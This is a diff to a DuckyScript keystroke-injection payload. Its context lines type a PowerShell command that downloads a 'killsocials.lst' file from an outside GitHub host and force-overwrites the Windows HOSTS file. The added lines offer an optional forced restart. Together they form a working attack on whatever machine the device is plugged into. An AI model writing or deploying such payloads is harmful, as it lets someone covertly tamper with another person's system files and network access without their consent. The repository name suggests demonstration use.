@@ -31,5 +31,8 @@ REM  - Change the URI to the correct path.
 STRING cd $Env:temp;Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/InfoSecREDD/REDD-Demo/main/DNS-POI/killsocials.lst' -OutFile 'HOSTS';Copy-Item 'HOSTS' -Destination 'C:\Windows\System32\drivers\etc\HOSTS' -Recurse -force;
 ENTER
 DELAY 1000
+REM Remove the next 2 REM's to restart the PC instead of letting it exit.
+REM STRING Restart-Computer
+REM ENTER
 STRING EXIT
 ENTER
